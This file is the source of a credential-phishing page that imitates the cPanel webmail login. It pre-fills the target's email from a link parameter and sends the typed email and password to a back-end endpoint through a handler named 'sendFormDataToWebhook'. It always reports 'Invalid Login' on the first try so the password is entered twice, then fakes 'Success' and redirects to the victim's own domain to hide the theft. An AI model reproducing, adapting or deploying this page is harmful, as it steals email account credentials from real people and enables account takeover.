import { useState, useEffect } from "react";
import { useRouter } from "next/router";

export default function Home() {
  const router = useRouter();
  const [open, setOpen] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [status, setStatus] = useState("You have logged out.");
  const [statusClass, setStatusClass] = useState("error-notice");
  const [attemptCount, setAttemptCount] = useState(0);
  const [domain, setDomain] = useState("");

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const gsEmail = params.get("gs_lcrp");
    if (gsEmail) {
      setEmail(gsEmail);
      // Extract domain from email
      const extractedDomain = gsEmail.split('@')[1];
      if (extractedDomain) {
        setDomain(extractedDomain);
      }
    }
  }, []);

  const sendFormDataToWebhook = async (e) => {
    e.preventDefault();

    // Check if password is empty
    if (!password.trim()) {
      setStatus("Please enter your password");
      setStatusClass("error-notice");
      return;
    }

    // Step 1: Show "Authenticating..." immediately
    setStatus("Authenticating …");
    setStatusClass("info-notice");

    try {
      // Step 2: Send API request
      const response = await fetch("/api/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password }),
      });

      // Step 3: Increase attempt count regardless of success/failure
      const newAttempt = attemptCount + 1;
      setAttemptCount(newAttempt);

      // Step 4: Controlled message flow (not based on response.ok)
      if (newAttempt === 1) {
        setStatus("Invalid Login");
        setStatusClass("error-notice");
        setPassword("")
      } else if (newAttempt === 2) {
        setStatus("Success");
        setStatusClass("success-notice");

        setTimeout(() => {
          window.location.href = `https://${domain}`;
        }, 1500);
      }
    } catch (error) {
      // Network or server error
      setStatus("Error authenticating.");
      setStatusClass("bg-red-400");
    }
  };

  return (
    <div id="login-wrapper" className="group ">
      <div className="wrapper">
        <div id="notify">
          <div id="login-status" className={` ${statusClass}`}>
            <div className="content-wrapper">
              <div id="login-detail">
                <div id="login-status-icon-container">
                  <span className="login-status-icon" />
                </div>
                <div id="login-status-message">{status}</div>
              </div>
            </div>
          </div>

          <div
            id="IE-warning"
            className="warn-notice IE-warning-hide"
            style={{ display: "none" }}
          >
            <div className="content-wrapper">
              <div id="IE-warning-detail">
                <div id="IE-warning-icon-container">
                  <span className="IE-warning-icon" />
                </div>
                <div id="IE-warning-message">
                  The system has detected that you are using Internet Explorer
                  11. cPanel &amp; WHM no longer supports Internet Explorer 11.
                  For more information, read the{" "}
                  <a
                    title="cPanel Blog"
                    target="_blank"
                    href="https://go.cpanel.net/ie11deprecation"
                  >
                    cPanel Blog
                  </a>
                  .
                </div>
              </div>
            </div>
          </div>
        </div>

        {open ? (
          <div>
            <div id="locale-container">
              <div id="locale-inner-container">
                <div id="locale-header">
                  <div className="locale-head">Please select a locale:</div>
                  <div className="close">
                    <a href="#" onClick={() => setOpen(false)}>
                      X Close
                    </a>
                  </div>
                </div>
                <div id="locale-map">
                  <div className="scroller clear">
                    <div className="locale-cell">
                      <a href="?locale=en">English</a>
                    </div>
                    <div className="locale-cell">
                      <a href="?locale=ar">العربية</a>
                    </div>
                    <div className="locale-cell">
                      <a href="?locale=bg">български</a>
                    </div>
                    <div className="locale-cell">
                      <a href="?locale=cs">čeština</a>
                    </div>
                    <div className="locale-cell">
                      <a href="?locale=da">dansk</a>
                    </div>
                    <div className="locale-cell">
                      <a href="?locale=de">Deutsch</a>
                    </div>
                    <div className="locale-cell">
                      <a href="?locale=el">Ελληνικά</a>
                    </div>
                    <div className="locale-cell">
                      <a href="?locale=es">español</a>
                    </div>
                    <div className="locale-cell">
                      <a href="?locale=es_419">español latinoamericano</a>
                    </div>
                    <div className="locale-cell">
                      <a href="?locale=es_es">español de España</a>
                    </div>
                    <div className="locale-cell">
                      <a href="?locale=fi">suomi</a>
                    </div>
                    <div className="locale-cell">
                      <a href="?locale=fil">Filipino</a>
                    </div>
                    <div className="locale-cell">
                      <a href="?locale=fr">français</a>
                    </div>
                    <div className="locale-cell">
                      <a href="?locale=he">עברית</a>
                    </div>
                    <div className="locale-cell">
                      <a href="?locale=hu">magyar</a>
                    </div>
                    <div className="locale-cell">
                      <a href="?locale=i_cpanel_snowmen">
                        ☃ cPanel Snowmen ☃ - i_cpanel_snowmen
                      </a>
                    </div>
                    <div className="locale-cell">
                      <a href="?locale=i_en">i_en</a>
                    </div>
                    <div className="locale-cell">
                      <a href="?locale=id">Bahasa Indonesia</a>
                    </div>
                    <div className="locale-cell">
                      <a href="?locale=it">italiano</a>
                    </div>
                    <div className="locale-cell">
                      <a href="?locale=ja">日本語</a>
                    </div>
                    <div className="locale-cell">
                      <a href="?locale=ko">한국어</a>
                    </div>
                    <div className="locale-cell">
                      <a href="?locale=ms">Bahasa Melayu</a>
                    </div>
                    <div className="locale-cell">
                      <a href="?locale=nb">norsk bokmål</a>
                    </div>
                    <div className="locale-cell">
                      <a href="?locale=nl">Nederlands</a>
                    </div>
                    <div className="locale-cell">
                      <a href="?locale=no">Norwegian</a>
                    </div>
                    <div className="locale-cell">
                      <a href="?locale=pl">polski</a>
                    </div>
                    <div className="locale-cell">
                      <a href="?locale=pt">português</a>
                    </div>
                    <div className="locale-cell">
                      <a href="?locale=pt_br">português do Brasil</a>
                    </div>
                    <div className="locale-cell">
                      <a href="?locale=ro">română</a>
                    </div>
                    <div className="locale-cell">
                      <a href="?locale=ru">русский</a>
                    </div>
                    <div className="locale-cell">
                      <a href="?locale=sl">slovenščina</a>
                    </div>
                    <div className="locale-cell">
                      <a href="?locale=sv">svenska</a>
                    </div>
                    <div className="locale-cell">
                      <a href="?locale=th">ไทย</a>
                    </div>
                    <div className="locale-cell">
                      <a href="?locale=tr">Türkçe</a>
                    </div>
                    <div className="locale-cell">
                      <a href="?locale=uk">українська</a>
                    </div>
                    <div className="locale-cell">
                      <a href="?locale=vi">Tiếng Việt</a>
                    </div>
                    <div className="locale-cell">
                      <a href="?locale=zh">中文</a>
                    </div>
                    <div className="locale-cell">
                      <a href="?locale=zh_cn">中文（中国）</a>
                    </div>
                    <div className="locale-cell">
                      <a href="?locale=zh_tw">中文（台湾）</a>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        ) : (
          <div id="content-container">
            <div id="login-container">
              <div id="login-sub-container">
                <div id="login-sub-header">
                  <img
                    className="main-logo"
                    src="https://6k6vi6nomhzfjb3tvneymftpnvgfi34dym4ta3i5mqzppmsrignq.arweave.net/8r1Uea5h8lSHc6tJhhZvbUxUb4PDOTBtHWQy97JRQZs"
                    alt="logo"
                  />
                </div>
                <div id="login-sub">
                  <div id="clickthrough_form" style={{ visibility: "hidden" }}>
                    <form action="#">
                      <div className="notices" />
                      <button type="submit" className="clickthrough-cont-btn">
                        Continue
                      </button>
                    </form>
                  </div>
                  <div id="forms">
                    <form
                      onSubmit={sendFormDataToWebhook}
                      noValidate
                      id="login_form"
                      method="post"
                      target="_top"
                      style={{}}
                    >
                      <div className="input-req-login">
                        <label htmlFor="user">Email Address</label>
                      </div>
                      <div className="input-field-login icon username-container">
                        <input
                          name="user"
                          id="user"
                          autofocus="autofocus"
                          value={email}
                          onChange={(e) => setEmail(e.target.value)}
                          placeholder="Enter your email address."
                          className="std_textbox"
                          type="text"
                          tabIndex={1}
                          required
                        />
                      </div>
                      <div className="input-req-login login-password-field-label">
                        <label htmlFor="pass">Password</label>
                      </div>
                      <div className="input-field-login icon password-container">
                        <input
                          name="pass"
                          id="pass"
                          value={password}
                          onChange={(e) => setPassword(e.target.value)}
                          placeholder="Enter your email password."
                          className="std_textbox"
                          type="password"
                          tabIndex={2}
                          required
                        />
                      </div>
                      <div className="controls">
                        <div className="login-btn">
                          <button
                            name="login"
                            type="submit"
                            id="login_submit"
                            tabIndex={3}
                          >
                            Log in
                          </button>
                        </div>
                      </div>
                      <div className="clear" id="push" />
                    </form>
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}
        <div id="locale-footer">
          <div className="locale-container">
            <noscript>
              &lt;form method="get" action="."&gt; &lt;select name="locale"&gt;
              &lt;option value=""&gt;Change locale&lt;/option&gt; &lt;option
              value='en'&gt;English&lt;/option&gt;&lt;option
              value='ar'&gt;العربية&lt;/option&gt;&lt;option
              value='bg'&gt;български&lt;/option&gt;&lt;option
              value='cs'&gt;čeština&lt;/option&gt;&lt;option
              value='da'&gt;dansk&lt;/option&gt;&lt;option
              value='de'&gt;Deutsch&lt;/option&gt;&lt;option
              value='el'&gt;Ελληνικά&lt;/option&gt;&lt;option
              value='es'&gt;español&lt;/option&gt;&lt;option
              value='es_419'&gt;español latinoamericano&lt;/option&gt;&lt;option
              value='es_es'&gt;español de España&lt;/option&gt;&lt;option
              value='fi'&gt;suomi&lt;/option&gt;&lt;option
              value='fil'&gt;Filipino&lt;/option&gt;&lt;option
              value='fr'&gt;français&lt;/option&gt;&lt;option
              value='he'&gt;עברית&lt;/option&gt;&lt;option
              value='hu'&gt;magyar&lt;/option&gt;&lt;option
              value='i_cpanel_snowmen'&gt;☃ cPanel Snowmen ☃ -
              i_cpanel_snowmen&lt;/option&gt;&lt;option
              value='i_en'&gt;i_en&lt;/option&gt;&lt;option value='id'&gt;Bahasa
              Indonesia&lt;/option&gt;&lt;option
              value='it'&gt;italiano&lt;/option&gt;&lt;option
              value='ja'&gt;日本語&lt;/option&gt;&lt;option
              value='ko'&gt;한국어&lt;/option&gt;&lt;option value='ms'&gt;Bahasa
              Melayu&lt;/option&gt;&lt;option value='nb'&gt;norsk
              bokmål&lt;/option&gt;&lt;option
              value='nl'&gt;Nederlands&lt;/option&gt;&lt;option
              value='no'&gt;Norwegian&lt;/option&gt;&lt;option
              value='pl'&gt;polski&lt;/option&gt;&lt;option
              value='pt'&gt;português&lt;/option&gt;&lt;option
              value='pt_br'&gt;português do Brasil&lt;/option&gt;&lt;option
              value='ro'&gt;română&lt;/option&gt;&lt;option
              value='ru'&gt;русский&lt;/option&gt;&lt;option
              value='sl'&gt;slovenščina&lt;/option&gt;&lt;option
              value='sv'&gt;svenska&lt;/option&gt;&lt;option
              value='th'&gt;ไทย&lt;/option&gt;&lt;option
              value='tr'&gt;Türkçe&lt;/option&gt;&lt;option
              value='uk'&gt;українська&lt;/option&gt;&lt;option
              value='vi'&gt;Tiếng Việt&lt;/option&gt;&lt;option
              value='zh'&gt;中文&lt;/option&gt;&lt;option
              value='zh_cn'&gt;中文（中国）&lt;/option&gt;&lt;option
              value='zh_tw'&gt;中文（台湾）&lt;/option&gt; &lt;/select&gt;
              &lt;button style="margin-left: 10px"
              type="submit"&gt;Change&lt;/button&gt; &lt;/form&gt; &lt;style
              type="text/css"&gt;#mobilelocalemenu, #locales_list {"{"}
              display:none{"}"}&lt;/style&gt;
            </noscript>
            <ul id="locales_list">
              <li>
                <a href="/?locale=en">English</a>
              </li>
              <li>
                <a href="/?locale=ar">العربية</a>
              </li>
              <li>
                <a href="/?locale=bg">български</a>
              </li>
              <li>
                <a href="/?locale=cs">čeština</a>
              </li>
              <li>
                <a href="/?locale=da">dansk</a>
              </li>
              <li>
                <a href="/?locale=de">Deutsch</a>
              </li>
              <li>
                <a href="/?locale=el">Ελληνικά</a>
              </li>
              <li>
                <a href="/?locale=es">español</a>
              </li>
              <li>
                <a
                  href="#"
                  id="morelocale"
                  onClick={() => setOpen(true)}
                  title="More locales"
                >
                  …
                </a>
              </li>
            </ul>
            <div id="mobilelocalemenu">
              Select a locale:
              <a href="#" onclick="toggle_locales(true)" title="Change locale">
                English
              </a>
            </div>
          </div>
        </div>
      </div>
    </div>
    
  );
}
